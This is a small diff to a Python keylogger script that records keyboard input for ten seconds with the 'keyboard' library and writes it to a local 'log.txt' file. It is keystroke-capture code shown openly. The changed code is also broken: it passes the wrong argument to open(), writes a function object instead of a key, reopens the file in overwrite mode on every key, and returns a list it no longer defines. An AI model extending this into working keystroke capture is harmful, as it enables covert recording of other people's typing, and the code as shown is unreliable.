@@ -6,13 +6,15 @@ import keyboard
 import time
 
 start_time = time.time()
-log = []
 
 def logger():
     if keyboard.read_key():
-        log.append(keyboard.read_key)
+        with open('log.txt', 'w', 'utf-8') as f:
+            write_data = f.write(keyboard.read_key)
+
+def log_return():
+    while (time.time() - start_time) < 10:
+        logger()
     return log
 
-
-while (time.time() - start_time) < 10:
-    logger()
+log_return()
